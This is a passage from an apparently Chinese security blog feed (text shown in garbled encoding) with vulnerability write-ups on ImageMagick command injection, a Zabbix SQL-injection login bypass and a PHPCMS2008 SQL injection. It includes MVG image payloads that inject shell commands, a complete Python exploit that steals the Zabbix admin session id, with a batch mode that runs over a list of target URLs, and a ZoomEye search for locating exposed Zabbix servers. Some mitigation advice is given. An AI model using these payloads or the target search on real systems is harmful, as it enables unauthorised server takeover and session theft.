‡è¯†çš„é‚®ä»¶çš„å…¨éƒ¨æ–‡æœ¬</div><div class="line">DELEã€€ã€€deleã€€ã€€ã€€[Msg#]ã€€    å¤„ç†ã€€ã€€æœåŠ¡å™¨å°†ç”±å‚æ•°æ ‡è¯†çš„é‚®ä»¶æ ‡è®°ä¸ºåˆ é™¤ï¼Œç”±quitå‘½ä»¤æ‰§è¡Œ</div><div class="line">RSETã€€ã€€rsetã€€ã€€ã€€Noneã€€ã€€    å¤„ç†ã€€  æœåŠ¡å™¨å°†é‡ç½®æ‰€æœ‰æ ‡è®°ä¸ºåˆ é™¤çš„é‚®ä»¶ï¼Œç”¨äºæ’¤æ¶ˆDELEå‘½ä»¤</div><div class="line">TOPã€€ã€€ top  ã€€ã€€ [Msg#]ã€€ã€€  å¤„ç†ã€€  æœåŠ¡å™¨å°†è¿”å›ç”±å‚æ•°æ ‡è¯†çš„é‚®ä»¶å‰nè¡Œå†…å®¹ï¼Œnå¿…é¡»æ˜¯æ­£æ•´æ•°</div><div class="line">NOOPã€€ã€€noopã€€ã€€ã€€Noneã€€ã€€ã€€ã€€å¤„ç†ã€€ã€€æœåŠ¡å™¨è¿”å›ä¸€ä¸ªè‚¯å®šçš„å“åº”</div></pre></td></tr></table></figure>]]></content>
      
        
        <tags>
            
            <tag> çˆ†ç ´ </tag>
            
            <tag> ç¼–ç¨‹ </tag>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> Python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ImageMagickå‘½ä»¤æ‰§è¡Œæ¼æ´æµ…æ]]></title>
      <url>/2016/10/02/ImageMagick%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/</url>
      <content type="html"><![CDATA[<h1 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h1><h2 id="ä»€ä¹ˆæ˜¯ImageMagickï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯ImageMagickï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ImageMagickï¼Ÿ"></a>ä»€ä¹ˆæ˜¯ImageMagickï¼Ÿ</h2><p>ImageMagickæ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„å¼€æºå›¾å½¢å¤„ç†è½¯ä»¶,å¯ä»¥ç”¨æ¥è¯»ã€å†™å’Œå¤„ç†è¶…è¿‡90ç§çš„å›¾ç‰‡æ–‡ä»¶,åŒ…æ‹¬æµè¡Œçš„JPEGã€GIFã€ PNGã€PDFä»¥åŠPhotoCDç­‰æ ¼å¼ã€‚ä½¿ç”¨å®ƒå¯ä»¥å¯¹å›¾ç‰‡è¿›è¡Œåˆ‡å‰²ã€æ—‹è½¬ã€ç»„åˆç­‰å¤šç§ç‰¹æ•ˆçš„å¤„ç†ã€‚<br><a id="more"></a><br>ç”±äºå…¶åŠŸèƒ½å¼ºå¤§ã€æ€§èƒ½è¾ƒå¥½,å¹¶ä¸”å¯¹å¾ˆå¤šè¯­è¨€éƒ½æœ‰æ‹“å±•æ”¯æŒ,æ‰€ä»¥åœ¨ç¨‹åºå¼€å‘ä¸­è¢«å¹¿æ³›ä½¿ç”¨ã€‚è®¸å¤šç½‘ç«™å¼€å‘è€…å–œçˆ±ä½¿ç”¨ImageMagickæ‹“å±•æ¥åšwebä¸Šçš„å›¾ç‰‡å¤„ç†å·¥ä½œ,æ¯”å¦‚ç”¨æˆ·å¤´åƒç”Ÿæˆã€å›¾ç‰‡ç¼–è¾‘ç­‰ã€‚</p>
<h1 id="0x01-æ¼æ´æè¿°"><a href="#0x01-æ¼æ´æè¿°" class="headerlink" title="0x01 æ¼æ´æè¿°"></a>0x01 æ¼æ´æè¿°</h1><p>ImageMagickæ˜¯ä¸€æ¬¾å¼€æºå›¾ç‰‡å¤„ç†åº“ï¼Œæ”¯æŒPHPã€Rubyã€NodeJSå’ŒPythonç­‰å¤šç§è¯­è¨€ï¼Œä½¿ç”¨éå¸¸å¹¿æ³›ã€‚åŒ…æ‹¬PHP imagickã€Ruby rmagickå’Œpaperclipä»¥åŠNodeJS imagemagickç­‰å¤šä¸ªå›¾ç‰‡å¤„ç†æ’ä»¶éƒ½ä¾èµ–å®ƒè¿è¡Œã€‚å½“æ”»å‡»è€…æ„é€ å«æœ‰æ¶æ„ä»£ç å¾—å›¾ç‰‡æ—¶ï¼ŒImageMagickåº“å¯¹äºHTTPPSæ–‡ä»¶å¤„ç†ä¸å½“ï¼Œæ²¡æœ‰åšä»»ä½•è¿‡æ»¤ï¼Œå¯è¿œç¨‹å®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼Œè¿›è€Œå¯èƒ½æ§åˆ¶æœåŠ¡å™¨ã€‚</p>
<h1 id="0x02-å½±å“ç¨‹åº¦"><a href="#0x02-å½±å“ç¨‹åº¦" class="headerlink" title="0x02 å½±å“ç¨‹åº¦"></a>0x02 å½±å“ç¨‹åº¦</h1><p>æ”»å‡»æˆæœ¬ï¼šä½</p>
<p>å±å®³ç¨‹åº¦ï¼šé«˜</p>
<p>å½±å“èŒƒå›´ï¼šImageMagick 6.9.3-9ä»¥å‰çš„æ‰€æœ‰ç‰ˆæœ¬</p>
<h1 id="0x03-æ¼æ´åˆ†æ"><a href="#0x03-æ¼æ´åˆ†æ" class="headerlink" title="0x03 æ¼æ´åˆ†æ"></a>0x03 æ¼æ´åˆ†æ</h1><p>å‘½ä»¤æ‰§è¡Œæ¼æ´æ˜¯å‡ºåœ¨ImageMagickå¯¹httpså½¢å¼çš„æ–‡ä»¶å¤„ç†çš„è¿‡ç¨‹ä¸­ã€‚</p>
<p>ImageMagickä¹‹æ‰€ä»¥æ”¯æŒé‚£ä¹ˆå¤šçš„æ–‡ä»¶æ ¼å¼,æ˜¯å› ä¸ºå®ƒå†…ç½®äº†éå¸¸å¤šçš„å›¾åƒå¤„ç†åº“,å¯¹äºè¿™äº›å›¾åƒå¤„ç†åº“,ImageMagickç»™å®ƒèµ·äº†ä¸ªåå­—å«åšâ€Delegateâ€(å§”æ‰˜),æ¯ä¸ªDelegateå¯¹åº”ä¸€ç§æ ¼å¼çš„æ–‡ä»¶,ç„¶åé€šè¿‡ç³»ç»Ÿçš„system()å‘½ä»¤æ¥è°ƒç”¨å¤–éƒ¨çš„libè¿›è¡Œå¤„ç†ã€‚è°ƒç”¨å¤–éƒ¨libçš„è¿‡ç¨‹æ˜¯ä½¿ç”¨ç³»ç»Ÿçš„systemå‘½ä»¤æ¥æ‰§è¡Œçš„ï¼Œå¯¼è‡´å‘½ä»¤æ‰§è¡Œçš„ä»£ç ã€‚</p>
<p>ImageMagickå§”æ‰˜çš„é»˜è®¤é…ç½®æ–‡ä»¶ï¼š <code>/etc/ImageMagick/delegates.xml</code></p>
<p>å…·ä½“ä»£ç è¯·å‚è€ƒï¼š<a href="https://github.com/ImageMagick/ImageMagick/blob/25d021ff1a60a67680dbb640ccc0b6b60f785192/magick/delegate.c" target="_blank" rel="external">Github-ImageMagick</a></p>
<p>æˆ‘ä»¬å®šä½åˆ°httpså§”æ‰˜å¾—é‚£ä¸€è¡Œï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;  &lt;delegate decode=\&quot;https\&quot; command=\&quot;&amp;quot;wget&amp;quot; -q -O &amp;quot;%o&amp;quot; &amp;quot;https:%M&amp;quot;\&quot;/&gt;&quot;</div></pre></td></tr></table></figure></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œcommandå®šä¹‰äº†å®ƒå¯¹äºhttpsæ–‡ä»¶å¤„ç†æ—¶å¸¦å…¥system()å‡½æ•°å¾—å‘½ä»¤ï¼š<code>&quot;wget&quot; -q -O &quot;%o&quot; &quot;https:%M&quot;ã€‚</code></p>
<p><code>wget</code>æ˜¯ä»ç½‘ç»œä¸‹è½½æ–‡ä»¶å¾—å‘½ä»¤ï¼Œ<code>%M</code>æ˜¯ä¸€ä¸ªå ä½ç¬¦ï¼Œå®ƒå¾—å…·ä½“å®šä¹‰åœ¨é…ç½®æ–‡ä»¶ä¸­å¦‚ä¸‹ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">%i  input image filename</div><div class="line">    %o  output image filename</div><div class="line">    %u  unique temporary filename</div><div class="line">    %Z  unique temporary filename</div><div class="line">    %#  input image signature</div><div class="line">    %b  image file size</div><div class="line">    %c  input image comment</div><div class="line">    %g  image geometry</div><div class="line">    %h  image rows (height)</div><div class="line">    %k  input image number colors</div><div class="line">    %l  image label</div><div class="line">    %m  input image format</div><div class="line">    %p  page number</div><div class="line">    %q  input image depth</div><div class="line">    %s  scene number</div><div class="line">    %w  image columns (width)</div><div class="line">    %x  input image x resolution</div><div class="line">    %y  input image y resolution</div></pre></td></tr></table></figure></p>
<p>å¯ä»¥çœ‹åˆ°%mè¢«å®šä¹‰ä¸ºè¾“å…¥çš„å›¾ç‰‡æ ¼å¼,ä¹Ÿå°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„urlåœ°å€ã€‚ä½†æ˜¯ç”±äºåªæ˜¯åšäº†ç®€å•çš„å­—ç¬¦ä¸²æ‹¼æ¥,æ²¡æœ‰åšä»»ä½•è¿‡æ»¤ï¼Œç›´æ¥æ‹¼æ¥åˆ°commandå‘½ä»¤ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°†å¼•å·é—­åˆåé€šè¿‡<code>&quot;|&quot;</code>,â€`â€,â€&amp;â€ç­‰å¸¦å…¥å…¶ä»–å‘½ä»¤,ä¹Ÿå°±å½¢æˆäº†å‘½ä»¤æ³¨å…¥ã€‚</p>
<p>æ¯”å¦‚æˆ‘ä»¬ä¼ å…¥å¦‚ä¸‹ä»£ç ï¼š</p>
<blockquote>
<p><a href="https://test.com&quot;|ls" target="_blank" rel="external">https://test.com&quot;|ls</a> â€œ-al</p>
</blockquote>
<p>åˆ™å®é™…å¾—systemå‡½æ•°æ‰§è¡Œå¾—å‘½ä»¤ä¸ºï¼š</p>
<blockquote>
<p>â€œwgetâ€ -q -O â€œ%oâ€ â€œ <a href="https://test.com&quot;|ls" target="_blank" rel="external">https://test.com&quot;|ls</a> â€œ-alâ€</p>
</blockquote>
<p>è¿™æ ·ï¼Œls -alå‘½ä»¤æˆåŠŸæ‰§è¡Œã€‚</p>
<h1 id="0x04-æ¼æ´åˆ©ç”¨"><a href="#0x04-æ¼æ´åˆ©ç”¨" class="headerlink" title="0x04 æ¼æ´åˆ©ç”¨"></a>0x04 æ¼æ´åˆ©ç”¨</h1><p>è¿™ä¸ªæ¼æ´å¾—pocç”±è€å¤–ç»™å‡ºå¾—ï¼Œå¦‚ä¸‹ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">push graphic-context</div><div class="line">viewbox 0 0 640 480</div><div class="line">fill &apos;url(https://&quot;|id; &quot;)&apos;</div><div class="line">pop graphic-context</div></pre></td></tr></table></figure></p>
<ol>
<li>pushå’Œpopæ˜¯ç”¨äºå †æ ˆçš„æ“ä½œï¼Œä¸€ä¸ªè¿›æ ˆï¼Œä¸€ä¸ªå‡ºæ ˆ;</li>
<li>viewboxæ˜¯è¡¨ç¤º<a href="http://baike.baidu.com/link?url=3qIrRPRNACGRtex1L-crgs6E-wXDYFtIsYDBiw9LFLeL_pJQM5hZrPcMG8KbVrlAb8fT46oY_BGLyHe3hbkqWF8GKJH7OT116rbq6din5W3" target="_blank" rel="external">SVG</a>å¯è§åŒºåŸŸçš„å¤§å°ï¼Œæˆ–è€…å¯ä»¥æƒ³è±¡æˆèˆå°å¤§å°ï¼Œç”»å¸ƒå¤§å°ã€‚ç®€å•ç†è§£å°±æ˜¯æ ¹æ®åé¢å¾—å‚æ•°é€‰å–å…¶ä¸­å¾—ä¸€éƒ¨åˆ†ç”»é¢;</li>
<li>fill url()æ˜¯æŠŠå›¾ç‰‡å¡«å……åˆ°å½“å‰å…ƒç´ å†…;</li>
</ol>
<p>åœ¨å…¶ä¸­æˆ‘ä»¬ä½¿ç”¨äº†fill url()çš„å½¢å¼è°ƒç”¨å­˜åœ¨æ¼æ´çš„https delegate,å½“ImageMagickå»å¤„ç†è¿™ä¸ªæ–‡ä»¶æ—¶,æ¼æ´å°±ä¼šè¢«è§¦å‘ã€‚</p>
<p><strong>é™„</strong>ï¼šImageMagické»˜è®¤æ”¯æŒä¸€ç§å›¾ç‰‡æ ¼å¼ï¼Œå«mvgï¼Œè€Œmvgä¸svgæ ¼å¼ç±»ä¼¼ï¼Œå…¶ä¸­æ˜¯ä»¥æ–‡æœ¬å½¢å¼å†™å…¥çŸ¢é‡å›¾çš„å†…å®¹ï¼Œå…è®¸åœ¨å…¶ä¸­åŠ è½½ImageMagickä¸­å…¶ä»–çš„delegate(æ¯”å¦‚å­˜åœ¨æ¼æ´çš„https delegate)ã€‚å¹¶ä¸”åœ¨å›¾å½¢å¤„ç†çš„è¿‡ç¨‹ä¸­,ImageMagickä¼šè‡ªåŠ¨æ ¹æ®å…¶å†…å®¹è¿›è¡Œå¤„ç†,ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥å°†æ–‡ä»¶éšæ„å®šä¹‰ä¸ºpngã€jpgç­‰ç½‘ç«™ä¸Šä¼ å…è®¸çš„æ ¼å¼,è¿™å¤§å¤§å¢åŠ äº†æ¼æ´çš„å¯åˆ©ç”¨åœºæ™¯ã€‚</p>
<p><strong>åˆ©ç”¨è¿‡ç¨‹ï¼š</strong></p>
<ol>
<li><p>åˆ›å»ºä¸€ä¸ªexploit.pngæ–‡ä»¶ï¼ŒåŒ…å«ä»¥ä¸‹å†…å®¹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">push graphic-context</div><div class="line">viewbox 0 0 640 480</div><div class="line">fill &apos;url(https://test.com/image.jpg&quot;|ls &quot;-al)&apos;</div><div class="line">pop graphic-context</div></pre></td></tr></table></figure>
</li>
<li><p>æ‰§è¡Œå‘½ä»¤ï¼š<code>convert exploit.png 1.png</code>(åé¢çš„æ˜¯convertçš„å‚æ•°)</p>
</li>
</ol>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/imagemagick1.png" alt=""></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/imagemagick2.png" alt=""></p>
<h1 id="0x05-æ¼æ´ä¿®å¤"><a href="#0x05-æ¼æ´ä¿®å¤" class="headerlink" title="0x05 æ¼æ´ä¿®å¤"></a>0x05 æ¼æ´ä¿®å¤</h1><ol>
<li>å‡çº§åˆ°æœ€æ–°ç‰ˆæœ¬</li>
<li>é…ç½®<code>/etc/ImageMagick/policy.xml</code>çš„æ–¹å¼æ¥ç¦æ­¢httpsã€mvgè¿™äº›delegate,æˆ–è€…ç›´æ¥åœ¨é…ç½®æ–‡ä»¶åˆ é™¤ç›¸åº”çš„delegate</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;policymap&gt;</div><div class="line">  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;EPHEMERAL&quot; /&gt;</div><div class="line">  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;URL&quot; /&gt;</div><div class="line">  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;HTTPS&quot; /&gt;</div><div class="line">  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;MVG&quot; /&gt;</div><div class="line">  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;MSL&quot; /&gt;</div><div class="line">&lt;/policymap&gt;</div></pre></td></tr></table></figure>]]></content>
      
        
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> ææƒ </tag>
            
            <tag> å‘½ä»¤æ‰§è¡Œ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Zabbix SQLæ³¨å…¥,ç»•è¿‡ç™»é™†]]></title>
      <url>/2016/09/23/Zabbix-SQL%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87%E7%99%BB%E9%99%86/</url>
      <content type="html"><![CDATA[<h1 id="0x00-æ¼æ´æ¦‚è¿°"><a href="#0x00-æ¼æ´æ¦‚è¿°" class="headerlink" title="0x00 æ¼æ´æ¦‚è¿°"></a>0x00 æ¼æ´æ¦‚è¿°</h1><p>Zabbixæ˜¯ä¸€ä¸ªå¼€æºçš„ä¼ä¸šçº§æ€§èƒ½ç›‘æ§è§£å†³æ–¹æ¡ˆã€‚zabbixçš„jsrpcçš„profileIdx2å‚æ•°å­˜åœ¨insertæ–¹å¼çš„SQLæ³¨å…¥æ¼æ´ï¼Œæ”»å‡»è€…æ— éœ€æˆæƒç™»é™†å³å¯ç™»é™†zabbixç®¡ç†ç³»ç»Ÿï¼Œä¹Ÿå¯é€šè¿‡scriptç­‰åŠŸèƒ½è½»æ˜“ç›´æ¥è·å–zabbixæœåŠ¡å™¨çš„æ“ä½œç³»ç»Ÿæƒé™ã€‚ ä½†æ˜¯æ— éœ€ç™»å½•æ³¨å…¥è¿™é‡Œæœ‰ä¸ªå‰æï¼Œå°±æ˜¯zabbixå¼€å¯äº†guestæƒé™ã€‚è€Œåœ¨zabbixä¸­ï¼Œguestçš„é»˜è®¤å¯†ç ä¸ºç©ºã€‚éœ€è¦æœ‰è¿™ä¸ªæ¡ä»¶çš„æ”¯æŒæ‰å¯ä»¥è¿›è¡Œæ— æƒé™æ³¨å…¥ã€‚<br><a id="more"></a></p>
<h1 id="0x01-å½±å“ç¨‹åº¦"><a href="#0x01-å½±å“ç¨‹åº¦" class="headerlink" title="0x01 å½±å“ç¨‹åº¦"></a>0x01 å½±å“ç¨‹åº¦</h1><p>æ”»å‡»æˆæœ¬ï¼šä½</p>
<p>å±å®³ç¨‹åº¦ï¼šé«˜</p>
<p>æ˜¯å¦ç™»é™†ï¼šä¸éœ€è¦</p>
<p>å½±å“èŒƒå›´ï¼š2.2.x, 3.0.0-3.0.3ã€‚ï¼ˆæ‘˜è‡ªFreebufï¼‰</p>
<h1 id="0x02-æ¼æ´æµ‹è¯•"><a href="#0x02-æ¼æ´æµ‹è¯•" class="headerlink" title="0x02 æ¼æ´æµ‹è¯•"></a>0x02 æ¼æ´æµ‹è¯•</h1><p>åœ¨Zabbixä¸­æœ‰ä¸¤ä¸ªæ–‡ä»¶å­˜åœ¨SQLæ³¨å…¥æ¼æ´ï¼Œåˆ†åˆ«æ˜¯<code>jsrpc.php</code>å’Œ<code>latest.php</code>ï¼Œå­˜åœ¨æ¼æ´å‚æ•°åˆ†åˆ«ä¸ºï¼š<code>profileIdx2</code>å’Œ<code>toggle_ids</code>ã€‚</p>
<p>åœ¨ç›®æ ‡çš„zabbixçš„åœ°å€åé¢åŠ ä¸Šå¦‚ä¸‹POCï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">/jsrpc.php?sid=0bcd4ade648214dc&amp;type=9&amp;method=screen.get&amp;tim</div><div class="line">estamp=1471403798083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=hi</div><div class="line">story.php&amp;profileIdx=web.item.graph&amp;profileIdx2=2&apos;666&amp;updateProfil</div><div class="line">e=true&amp;screenitemid=&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=</div><div class="line">17&amp;itemids%5B23297%5D=23297&amp;action=showlatest&amp;filter=&amp;filter_task=&amp;</div><div class="line">mark_color=1</div></pre></td></tr></table></figure>
<p>è‹¥è¿”å›é¡µé¢å‡ºç°<code>You have an error in your SQL syntax</code>åˆ™è¯æ˜å­˜åœ¨SQLæ³¨å…¥æ¼æ´ã€‚</p>
<p>æ¼æ´EXPï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line"># -*- coding: UTF-8 -*-</div><div class="line">&apos;&apos;&apos;</div><div class="line">@Authorï¼šw2n1ck</div><div class="line">@åšå®¢ï¼šhttp://byd.dropsec.xyz/</div><div class="line">&apos;&apos;&apos;</div><div class="line">import urllib,sys,urllib2,urllib</div><div class="line">def cookie(url):</div><div class="line">    poc=&apos;/jsrpc.php?sid=0bcd4ade648214dc&amp;type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2=(select 1 from (select count(*),concat(floor(rand(0)*2), (select sessionid from sessions where userid=1 and status=0 limit 1))x from information_schema.character_sets group by x)y)&amp;updateProfile=true&amp;screenitemid=&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17&amp;itemids%5B23297%5D=23297&amp;action=showlatest&amp;filter=&amp;filter_task=&amp;mark_color=&apos;</div><div class="line">    body= urllib.urlopen(url+poc).read()</div><div class="line">    cookie=body.split(&apos;Duplicate entry&apos;)[1].split(&apos;for key&apos;)[0][3:-2]</div><div class="line">    return cookie</div><div class="line">def test(cookie,url):</div><div class="line">    url=url+&apos;proxies.php&apos;</div><div class="line">    req=urllib2.Request(url)</div><div class="line">    cook=&quot;zbx_sessionid=%s&quot; % cookie</div><div class="line">    req.add_header(&apos;Cookie&apos;, cook)</div><div class="line">    response=urllib2.urlopen(req)</div><div class="line">    data=response.read()</div><div class="line">    if data.find(&apos;Access denied.&apos;) &lt; 0:</div><div class="line">        print &quot;OK--&gt;&quot;,cookie</div><div class="line">    else:</div><div class="line">        print &apos;ERROR&apos;</div><div class="line">if len(sys.argv)==4:</div><div class="line">    for i in open(sys.argv[3]).readlines():</div><div class="line">        print i</div><div class="line">        test(cookie(i),i)</div><div class="line">else:</div><div class="line">    print sys.argv[1]</div><div class="line">    test(cookie(sys.argv[1]),sys.argv[1])</div></pre></td></tr></table></figure></p>
<p><strong>è®¾è®¡æ­¥éª¤</strong>ï¼š<br>é¦–å…ˆæŸ¥è¯¢çš„sqlè¯­å¥ä¸ºï¼š<code>select 1 from (select count(*),concat(floor(rand(0)*2), (select sessionid from sessions where userid=1 and status=0 limit 1))x from information_schema.character_sets group by x)y</code></p>
<p>æŸ¥è¯¢çš„<code>sessionid</code>ä¼šåœ¨é¡µé¢ä¸­æ˜¾ç¤º</p>
<p>ç„¶åé€šè¿‡<code>body.split(&#39;Duplicate entry&#39;)[1].split(&#39;for key&#39;)[0][3:-2]</code>æ¥å–å‡º<code>sessionid</code>çš„å€¼,å…·ä½“çš„å¯ä»¥çœ‹å“åº”çš„é¡µé¢ç»“æ„</p>
<p>ç„¶åå¸¦å…¥cookieè®¿é—®<code>proxies.php</code>ï¼Œå¦‚æœæ²¡æœ‰å‡ºç°<code>Access denied.</code></p>
<p>åˆ™è¯´æ˜è¿›å…¥æˆåŠŸï¼Œè¾“å‡º<code>sessionid</code>çš„å€¼</p>
<p>å‚è€ƒ:<a href="http://www.waitalone.cn/zabbix-sql-1.html" target="_blank" rel="external">ç‹¬è‡ªç­‰å¾…åšå®¢EXP</a></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/zabbix_sql1.png" alt=""></p>
<h1 id="0x03-æ¼æ´ä¿®å¤"><a href="#0x03-æ¼æ´ä¿®å¤" class="headerlink" title="0x03 æ¼æ´ä¿®å¤"></a>0x03 æ¼æ´ä¿®å¤</h1><p>1ã€ç¦ç”¨åå°ç”¨æˆ·guestè´¦å·ï¼ˆæ³¨å…¥è¦æ±‚æ­¤è´¦å·å¯ç”¨ï¼‰ã€‚</p>
<p>2ã€å‡çº§åˆ°zabbixçš„æœ€æ–°ç‰ˆã€‚</p>
<h1 id="0x04-æ‰¹é‡æŸ¥æ‰¾"><a href="#0x04-æ‰¹é‡æŸ¥æ‰¾" class="headerlink" title="0x04 æ‰¹é‡æŸ¥æ‰¾"></a>0x04 æ‰¹é‡æŸ¥æ‰¾</h1><p>ä¸Š<a href="www.zoomeye.org">Zoomeye</a>ï¼Œè¾“å…¥æŸ¥è¯¢å…³é”®å­—:<code>Zabbix port:80</code>ï¼Œå½“ç„¶ï¼Œå¦‚æœä½ æƒ³å®šç‚¹æŸ¥è¯¢çš„è¯è¿˜å¯ä»¥åŠ ä¸Š<code>country:</code> <code>City:</code>ç­‰å­—æ®µï¼Œæ¯”å¦‚æŸ¥è¯¢åŒ—äº¬<code>Zabbix country:china port:80 city:Beijing</code>;</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/Zabbix_sql2.png" alt=""></p>
]]></content>
      
        
        <tags>
            
            <tag> ç¼–ç¨‹ </tag>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> è‡ªåŠ¨åŒ– </tag>
            
            <tag> SQLæ³¨å…¥ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[PHPCMS2008å¹¿å‘Šæ¨¡æ¿SQLæ³¨å…¥æ¼æ´]]></title>
      <url>/2016/09/22/PHPCMS2008%E5%B9%BF%E5%91%8A%E6%A8%A1%E6%9D%BFSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
      <content type="html"><![CDATA[<h1 id="0x00-æ¼æ´æè¿°"><a href="#0x00-æ¼æ´æè¿°" class="headerlink" title="0x00 æ¼æ´æè¿°"></a>0x00 æ¼æ´æè¿°</h1><p>PHPCMS2008ç”±äºå¹¿å‘Šæ¨¡å—å–<code>referer</code>ä¸ä¸¥ï¼Œå¯¼è‡´ä¸€å¤„sqlæ³¨å…¥æ¼æ´.å¯ä»¥å¾—åˆ°ç®¡ç†å‘˜ç”¨æˆ·åä¸å¯†ç ï¼Œæ”»å‡»è€…ç™»å½•åå°åå¯èƒ½ä¼šè·å–webshellï¼Œå¯¹æœåŠ¡å™¨è¿›è¡Œè¿›ä¸€æ­¥çš„æ¸—é€ã€‚</p>
<a id="more"></a>
<h1 id="0x01-æ¼æ´åˆ†æ"><a href="#0x01-æ¼æ´åˆ†æ" class="headerlink" title="0x01 æ¼æ´åˆ†æ"></a>0x01 æ¼æ´åˆ†æ</h1><p><strong>æ¼æ´äº§ç”Ÿçš„ä½ç½®ï¼š</strong><br><code>/ads/include/ads_place.class.php</code>çš„<code>show</code>æ–¹æ³•ä¸­.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">function show($placeid)</div><div class="line">		...</div><div class="line">		if($adses[0][&apos;option&apos;])</div><div class="line">		&#123;</div><div class="line">			foreach($adses as $ads)</div><div class="line">			&#123;</div><div class="line">				$contents[] = ads_content($ads, 1);</div><div class="line">				$this-&gt;db-&gt;query(â€œINSERT INTO$this-&gt;stat_table(`adsid`,`username`,`ip`,`referer`,`clicktime`,`type`)VALUES (â€˜$ads[adsid]â€™,â€™$_usernameâ€™,â€™$ipâ€™,â€˜$this-&gt;referrerâ€™,â€˜$timeâ€™,,â€™0â€™)â€);</div><div class="line">				$template = $ads[&apos;template&apos;] ? $ads[&apos;template&apos;] : &apos;ads&apos;;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	...</div></pre></td></tr></table></figure>
<p>sqlè¯­å¥ä¸­</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$this-&gt;db-&gt;query(â€œINSERT INTO$this-&gt;stat_table(`adsid`,`username`,`ip`,`referer`,`clicktime`,`type`)VALUES (â€˜$ads[adsid]â€™,â€™$_usernameâ€™,â€™$ipâ€™,â€˜$this-&gt;referrerâ€™,â€˜$timeâ€™,,â€™0â€™)â€);</div></pre></td></tr></table></figure>
